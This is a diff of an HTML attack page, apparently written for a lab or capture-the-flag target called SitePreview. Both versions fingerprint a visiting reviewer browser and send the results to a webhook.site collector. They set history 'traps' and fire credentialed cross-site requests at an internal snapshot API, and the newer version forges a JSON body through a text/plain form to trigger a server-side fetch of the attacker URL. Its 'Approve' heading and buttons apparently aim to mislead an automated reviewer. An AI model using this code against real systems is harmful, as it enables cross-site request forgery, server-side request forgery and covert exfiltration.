@@ -1,111 +1,49 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>SitePreview Batched Diagnostic v6</title>
-  <style>
-    body { font-family: sans-serif; }
-    iframe { width: 900px; height: 650px; border: 1px solid #888; }
-    button { width: 220px; height: 70px; margin: 8px; }
-  </style>
+  <meta charset="utf-8">
+  <title>SitePreview reviewer diagnostic v6</title>
 </head>
 <body>
-  <h1>SitePreview Batched Diagnostic v6</h1>
-  <button id="reject">Reject</button>
-  <button id="approve">Approve</button>
-  <pre id="results"></pre>
-  <div id="frames"></div>
-<script>
-const webhook = "https://webhook.site/63195811-1d56-47ad-bbc1-9598f721f419";
-const params = new URLSearchParams(location.search);
-const previewId = params.get("p") || "";
-const cb = (event, value = "") => {
-  const q = new URLSearchParams({
-    event,
-    value: String(value),
-    time: new Date().toISOString(),
-    href: location.href
-  });
-  document.getElementById("results").textContent += event + ": " + value + "\n";
-  fetch(webhook + "?" + q, {
-    mode: "no-cors",
-    credentials: "omit",
-    keepalive: true,
-    cache: "no-store"
-  }).catch(() => {});
-};
-cb("v6-start", JSON.stringify({
-  ua: navigator.userAgent,
-  webdriver: navigator.webdriver,
-  referrer: document.referrer,
-  opener: !!window.opener,
-  activation: navigator.userActivation && {
-    active: navigator.userActivation.isActive,
-    hasBeenActive: navigator.userActivation.hasBeenActive
-  },
-  previewId
-}));
-for (const name of ["focus", "blur", "pageshow", "pagehide", "beforeunload"]) {
-  addEventListener(name, e => cb("v6-" + name, e.persisted ?? ""));
-}
-addEventListener("visibilitychange", () => cb("v6-visibility", document.visibilityState));
-addEventListener("popstate", () => cb("v6-popstate", location.href));
-for (const id of ["reject", "approve"]) {
-  document.getElementById(id).addEventListener("click", e => cb("v6-click-" + id, JSON.stringify({
-    trusted: e.isTrusted,
-    active: navigator.userActivation && navigator.userActivation.isActive
-  })));
-}
-history.pushState({n:1}, "", location.href + "#trap1");
-history.pushState({n:2}, "", location.href.replace(/#.*$/, "") + "#trap2");
-history.pushState({n:3}, "", location.href.replace(/#.*$/, "") + "#trap3");
-cb("v6-history", history.length);
-
-function addFrame(name, url) {
-  const f = document.createElement("iframe");
-  f.name = name;
-  f.src = url;
-  f.onload = () => {
-    let len = "err";
-    try { len = f.contentWindow.length; } catch (e) { len = e.name; }
-    cb("v6-frame-" + name, "loaded:length=" + len);
-  };
-  document.getElementById("frames").appendChild(f);
-  return f;
-}
-addFrame("settings", "http://web:3000/settings");
-if (previewId) addFrame("preview", "http://web:3000/preview/" + encodeURIComponent(previewId));
-
-(async () => {
-  const tests = [
-    ["get-settings", "http://web:3000/settings", {method:"GET"}],
-    ["snapshot-text", "http://web:3000/api/snapshot", {
-      method:"POST",
-      headers: {"Content-Type":"text/plain;charset=UTF-8"},
-      body: JSON.stringify({url: webhook + "?event=v6-snapshot-browser&value=visited"}),
-      credentials:"include"
-    }],
-    ["snapshot-form", "http://web:3000/api/snapshot", {
-      method:"POST",
-      headers: {"Content-Type":"application/x-www-form-urlencoded"},
-      body: JSON.stringify({url: webhook + "?event=v6-snapshot-form-browser&value=visited"}),
-      credentials:"include"
-    }]
-  ];
-  for (const [name, url, init] of tests) {
-    const start = performance.now();
-    try {
-      const r = await fetch(url, {...init, mode:"no-cors", cache:"no-store"});
-      cb("v6-fetch-" + name, r.type + ":" + Math.round(performance.now() - start));
-    } catch (e) {
-      cb("v6-fetch-" + name, e.name + ":" + e.message + ":" + Math.round(performance.now() - start));
+  <h1>Approve</h1>
+  <button id="approve" onclick="report('clicked-approve')">Approve</button>
+  <button id="reject" onclick="report('clicked-reject')">Reject</button>
+  <form id="snapshot-form" method="POST" enctype="text/plain" target="snapshot-window"
+        action="http://web:3000/api/snapshot">
+    <input name='{"url":"https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/snapshot?source'
+           value='form"}'>
+  </form>
+  <pre id="log"></pre>
+  <script>
+    const hook = 'https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/event';
+    function report(event, value = '') {
+      document.querySelector('#log').textContent += `${event}: ${value}\n`;
+      (new Image()).src = `${hook}?event=${encodeURIComponent(event)}&value=${encodeURIComponent(value)}&t=${Date.now()}`;
     }
-  }
-  let pop = null;
-  try { pop = window.open("http://web:3000/settings", "v6popup"); } catch (e) {}
-  cb("v6-popup", pop ? "opened" : "blocked");
-  cb("v6-complete", "yes");
-})();
-</script>
+
+    report('v6-start', `${location.href}|${document.referrer}|${navigator.userAgent}`);
+
+    fetch('http://web:3000/api/snapshot', {
+      method: 'POST',
+      mode: 'no-cors',
+      credentials: 'include',
+      headers: { 'Content-Type': 'text/plain' },
+      body: JSON.stringify({
+        url: 'https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/snapshot?source=fetch'
+      })
+    }).then(r => report('fetch-resolved', r.type)).catch(e => report('fetch-error', e.name));
+
+    setTimeout(() => {
+      report('form-submit');
+      try {
+        document.querySelector('#snapshot-form').submit();
+        report('form-submit-returned');
+      } catch (e) {
+        report('form-error', e.name);
+      }
+    }, 400);
+    setTimeout(() => report('alive-1s'), 1000);
+    setTimeout(() => report('alive-3s'), 3000);
+  </script>
 </body>
 </html>
